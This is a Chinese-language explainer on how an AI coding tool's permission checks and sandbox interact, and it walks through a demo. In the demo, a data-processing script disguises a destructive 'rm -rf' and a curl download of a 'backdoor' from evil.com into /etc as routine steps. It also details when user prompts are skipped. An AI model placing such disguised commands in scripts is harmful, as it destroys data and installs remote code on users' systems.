# 权限系统与沙盒：耦合关系 + 完整执行流程演示

## 一、权限系统与沙盒：解耦还是耦合？

### 直接回答

**存在耦合，但是单向的、有限的、只在两个具体位置。**

```
权限系统 ──────单向读取沙盒配置──────→ 沙盒系统
   │                                     │
   │          ←── 沙盒完全不知道 ──         │
   │             权限系统的存在             │
   │                                      │
做 yes/no 决定                      管执行时的限制
```

- 权限系统**会**参考沙盒的状态来做决定
- 沙盒**完全不知道**权限系统的存在，也从不参与 yes/no 决策
- 耦合是单向的

### 耦合点一：通用权限流水线，步骤 1b

位置：`permissions.ts` 中 `hasPermissionsToUseToolInner` 的步骤 1b。

场景：用户给 Bash 设了 ask 规则（意思是"AI 每次调 Bash 都要问过我"）。就是说**用户要求AI 每次调 Bash 都要问过我，但是如果Bash权限系统发现这条命令会在沙盒里面跑，就不会询问用户。**

```
正常情况下：命中 ask 规则 → 弹框问用户

但有例外：
  如果这条命令会在沙盒里跑
  而且用户开了 autoAllowBashIfSandboxed（默认开启）
  → 跳过 ask 规则，不弹框了
  → 让后续步骤继续判断
```

这里的逻辑是：用户设 ask 规则是出于安全考虑。但如果命令已经在沙盒里跑了，安全性已经有了保障，没必要再弹框打断用户。

### 耦合点二：Bash 自己的权限检查，第一步

位置：`bashPermissions.ts` 中 `bashToolHasPermission` 的第 1 步。

Bash 权限系统在开始分析一条命令之前，第一个动作就是问沙盒：

```
checkSandboxAutoAllow():
  ① 沙盒功能启用了吗？→ 是
  ② autoAllowBashIfSandboxed 开启了吗？→ 是（默认开启）
  ③ 这条命令等一下会不会进沙盒？→ 会（不在 excludedCommands 里）
  ④ 有没有显式的 deny 或 ask 规则命中？→ 没有
  → 直接返回 allow

不用再往下分析命令结构了，不用查白名单了，不用判断只读了。
因为有沙盒兜底，直接放行。
```

### "耦合"的精确含义

耦合不是说两套系统互相依赖、共同决策。耦合仅仅意味着：

> 权限系统在做决定时，会问一句"沙盒开着吗？这条命令会进沙盒吗？"如果答案是"会"，权限系统就可以更宽松。但允许还是拒绝，始终是权限系统一个系统说了算。

类比：你出门前看天气预报。天气预报不替你决定去哪，但它影响你的决策——"会下雨"→ 你带伞；"不会下雨"→ 你不带。这里天气预报（沙盒）不替你做决定，但你做决定时参考了它。

### 这种耦合有没有问题

没有。因为耦合是**单向**的：
- 如果权限系统拒绝了 → 沙盒根本不会执行 → 不存在"沙盒覆盖权限"的可能
- 如果沙盒关了 → 权限系统自动恢复到更严格的判断（不会因为没有沙盒就乱放行）
- 如果沙盒开了 → 权限系统可以更宽松（因为有安全网兜底）

### 关键约束：沙盒不能覆盖 deny

这一点在所有文档里反复强调，因为它是最重要的安全保证：

```
用户有 deny 规则 "Bash(curl:*)" + AI 想执行 "Bash(curl evil.com)"

权限流水线步骤：① 系统底线 → 不触发
                ② 用户 deny 规则 → 命中！→ 拒绝

deny 规则在权限流水线的第 2 步（不可绕过组）。
沙盒相关逻辑在后续步骤。
还没轮到沙盒发言，命令已经被拒绝了。

沙盒不能、也不会覆盖 deny 规则。
```

## 二、完整演示：AI 执行一个包含危险命令的 Python 脚本

### 场景设置

假设 AI 想帮你处理一些数据，它创建了一个 Python 脚本 `process.py`，内容是：

```python
import os
import urllib.request

print("步骤 1：读取配置文件...")
with open("config.json", "r") as f:
    config = f.read()
print(f"配置内容：{config}")

print("步骤 2：清理旧的临时数据...")
os.system("rm -rf /tmp/important_data")
print("已清理")

print("步骤 3：下载最新的数据文件...")
os.system("curl -o /etc/malicious http://evil.com/backdoor")
print("下载完成")

print("步骤 4：生成报告...")
with open("report.txt", "w") as f:
    f.write("处理完成")
print("报告已生成")
```

这个脚本有四步：
1. 读取项目里的配置文件 → 正常操作
2. 删除 `/tmp/important_data` → 危险（删除数据）
3. 下载恶意代码到 `/etc/` → 危险（下载 + 写系统目录）
4. 在项目目录里生成报告文件 → 正常操作

### 此时用户的配置

```
权限模式：default
沙盒：sandbox.enabled = true（默认）
     autoAllowBashIfSandboxed = true（默认）
     excludedCommands = []（空，所有命令都进沙盒）
     allowUnsandboxedCommands = false（默认，AI 不能要求不沙盒化）
用户规则：空（新手用户，还没设过任何规则）
项目目录：~/my-project/
```

### 阶段一：AI 发出命令

```
AI 想执行：Bash("python process.py")

AI 只知道自己在执行一条 Python 脚本。
它不知道（也不关心）这条命令会不会在沙盒里执行。
它也不知道 permissions 系统会怎么判断它。
```

### 阶段二：权限系统判断"能不能执行"

```
════════════════════════════════════════════════════

步骤① 系统安全底线检查

  python process.py
  → 不含 eval、source、exec
  → 不直接操作受保护路径（~/.claude/、.git/内部）
  → 不触发底线

步骤② 用户规则检查

  用户没设过任何 deny/allow/ask 规则
  → 不触发

步骤③ Bash 权限系统检查

  第 1 步：checkSandboxAutoAllow（沙盒自动允许）

    问：沙盒启用了吗？
    答：是（sandbox.enabled = true）

    问：autoAllow 开启了吗？
    答：是（autoAllowBashIfSandboxed = true，默认开启）

    问：这条命令会进沙盒吗？
    答：会（python 不在 excludedCommands 列表里）

    问：有没有 deny 规则命中？
    答：没有（用户还没有任何规则）

    → checkSandboxAutoAllow 返回 allow
    → 理由是 "Auto-allowed with sandbox"

  权限系统得出结论：允许执行，不弹框问用户。

  注意：权限系统在这一步看到的只是 python process.py 这几个字，
  它完全不知道 process.py 里面写了 rm -rf 和 curl 这些危险操作。

════════════════════════════════════════════════════
最终决定：允许执行
════════════════════════════════════════════════════
```

### 阶段三：沙盒生成限制规则

```
命令进入 Bash 工具的执行阶段。

沙盒系统判断：是否进沙盒？

  ├─ sandbox.enabled = true ✓
  ├─ 平台支持（macOS）✓
  ├─ sandbox-exec 已安装 ✓
  ├─ 命令不在 excludedCommands 里 ✓
  └─ AI 没传 dangerouslyDisableSandbox ✓

  → 决定：进沙盒

动态生成沙盒规则：

文件系统规则合成：
  来源 1（默认）：整个文件系统只读
  来源 2（权限规则推导）：没有 → 不加
  来源 3（用户 sandbox.filesystem 配置）：没配 → 不加
  来源 4（系统硬编码）：
    永远不可写：
      ~/.claude/settings.json
      ~/.claude/ 下所有配置文件
      ~/my-project/.git/HEAD
      ~/my-project/.git/objects/
      ~/my-project/.git/refs/
      ~/my-project/.git/hooks/
      ~/my-project/.git/config
  来源 5（工作目录）：
    可写：~/my-project/
    可写：/tmp/claude-sandbox-xxxxx/（临时工作目录）

最终文件系统规则：
  可读：整个文件系统
  可写：~/my-project/
        /tmp/claude-sandbox-xxxxx/
  不可写：/etc/（整个系统目录都是只读）
          /tmp/important_data（位于 /tmp 根下，不在临时工作子目录里）
          ~/.claude/**
          ~/my-project/.git/内部文件

网络规则合成：
  来源 1（默认）：禁止所有网络
  来源 4（系统硬编码）：localhost / 127.0.0.1 允许
  用户没配 allowedDomains → 没有额外允许

最终网络规则：
  允许：localhost, 127.0.0.1
  禁止：其他所有（包括 evil.com）
```

### 阶段四：脚本在沙盒内实际执行

```
$ python process.py

═══════════════════════════════════════════════════
步骤 1：读取 config.json
═══════════════════════════════════════════════════

  Python open("config.json", "r")
  → config.json 在 ~/my-project/ 下
  → 沙盒允许读此路径
  → 读取成功

  输出：配置内容：{"name": "test", "version": "1.0"}

═══════════════════════════════════════════════════
步骤 2：rm -rf /tmp/important_data
═══════════════════════════════════════════════════

  Python os.system("rm -rf /tmp/important_data")
  → 启动子进程 rm

  rm 尝试删除 /tmp/important_data
  → 系统调用：unlink("/tmp/important_data")

  操作系统内核介入：
  → 检查沙盒规则
  → /tmp/important_data 不在可写列表中
  → /tmp/important_data 的父目录 /tmp 不在可写列表中
     （只有 /tmp/claude-sandbox-xxxxx/ 子目录可写）
  → 拒绝！

  rm 收到错误：Permission denied
  rm 进程退出，返回失败状态

  沙盒记录违规：
    "尝试写入 /tmp/important_data（不在允许写入的路径中）"

  输出：rm: cannot remove '/tmp/important_data': Permission denied

  ⚠️ 重要数据保住了！沙盒阻止了删除。

═══════════════════════════════════════════════════
步骤 3：curl -o /etc/malicious http://evil.com/backdoor
═══════════════════════════════════════════════════

  Python os.system("curl -o /etc/malicious http://evil.com/backdoor")
  → 启动子进程 curl

  curl 第一步：域名解析
  → 尝试连接 evil.com 的 DNS 服务器

  操作系统内核介入：
  → 检查沙盒网络规则
  → evil.com 不在允许的网络地址列表里
  → 拒绝网络连接！

  curl 收到错误：Could not resolve host: evil.com

  沙盒记录违规：
    "尝试网络连接 evil.com（不在允许的域名列表中）"

  即使 curl 成功连接了，第二步写文件也会失败：
  → /etc/malicious 在 /etc/ 下
  → /etc/ 整个目录在沙盒中是只读的
  → 写操作同样会被内核拦截

  输出：curl: (6) Could not resolve host: evil.com

  ⚠️ 恶意下载被双重拦截：网络层 + 文件系统层。

═══════════════════════════════════════════════════
步骤 4：生成报告 report.txt
═══════════════════════════════════════════════════

  Python open("report.txt", "w")
  → report.txt 在 ~/my-project/ 下
  → 沙盒允许写此路径
  → 写入成功

  输出：报告已生成
```

### 阶段五：执行完毕，结果汇总

```
Python 进程退出（exit code 仍然为 0，因为 Python 本身没崩溃，
只是两个子命令失败了）。

Claude Code 汇总：

  stdout（标准输出）：
    步骤 1：读取配置文件...
    配置内容：{"name": "test", "version": "1.0"}
    步骤 2：清理旧的临时数据...
    rm: cannot remove '/tmp/important_data': Permission denied
    步骤 3：下载最新的数据文件...
    curl: (6) Could not resolve host: evil.com
    步骤 4：生成报告...
    报告已生成

  exitCode: 0

  sandboxViolations（沙盒违规记录）：
    · 文件写入尝试被拦截：/tmp/important_data
    · 网络连接尝试被拦截：evil.com
```

### 阶段六：AI 收到结果，分析发生了什么

AI 看到的 tool_result：

```
stdout 显示：
  - 步骤 1 和步骤 4 成功执行
  - 步骤 2 的 rm 命令失败，原因是 Permission denied
  - 步骤 3 的 curl 命令失败，原因是域名无法解析

沙盒违规信息：
  - 脚本尝试了两项不被允许的操作
  - 都和沙盒的安全策略冲突
```

AI 根据这些信息可以推断：
- `config.json` 读取成功 → 项目目录正常可访问
- `report.txt` 写入成功 → 项目目录正常可写
- `rm` 失败 → 脚本尝试删除受保护的路径
- `curl` 失败 → 脚本尝试连接外部服务器
- 结论：**脚本里有危险操作，被沙盒自动拦截了**

AI 可能的反应：
- 告诉用户："脚本运行了，但其中有两步操作因为安全限制被阻止了：尝试删除 /tmp 下的文件、尝试连接外部服务器。"
- 如果这些操作是用户确实想做的（比如需要下载数据），AI 可能会建议用户配置沙盒的网络允许列表，或者把 `/tmp/important_data` 拷到项目目录里再操作。

## 三、这个例子揭示的关键设计

### 1. 权限系统看不到脚本内部

权限系统只看到了 `python process.py`。它不能（也不会尝试）解析 `process.py` 的内容。`python` 作为命令被归类为"不是只读的"（因为 Python 解释器有能力做任何操作），所以如果没有沙盒，这条命令应该弹框问用户。但有沙盒自动允许，权限系统判断风险可控，跳过了弹框。

### 2. 沙盒不需要理解脚本

沙盒完全不关心 `process.py` 里面写了什么。它只管一件事：**这个进程（以及它启动的所有子进程——`rm`、`curl`）的每一次文件操作和网络请求，都必须通过规则检查。** 不过则拦。

### 3. 危险在操作系统内核层被拦截

不是 Claude Code 在"监控" Python 脚本的行为。是操作系统内核直接拒绝了 `rm` 的 `unlink` 系统调用和 `curl` 的 `connect` 系统调用。内核级别的拦截意味着**没有任何方式可以绕过**——即使脚本尝试用更深层的系统调用，同样会被拦截。

### 4. 多层防护的协同

```
第一层：权限系统
  → 只判断命令本身是否安全（能力有限，看不到脚本内容）
  → 但可以拦截"明确知道是危险"的命令（如直接的 rm -rf）

第二层：沙盒
  → 不判断是否安全，只限制执行时的能力
  → 不管脚本内容是什么，危险操作直接在内核层拦截

两层合在一起的效果：
  权限系统放行（因为判断不了脚本是否危险）
  → 沙盒执行（把危险操作全拦了）
  → 没有造成实际损害
```

### 5. deny 规则仍然是最高优先级

如果用户在这个场景里设了 `Bash(python:*) → deny`，那么流程在权限阶段的步骤②就结束了。沙盒不会执行，脚本不会运行。**沙盒让"不确定"可以放行，但绝对不让"明确禁止"的绕过。**
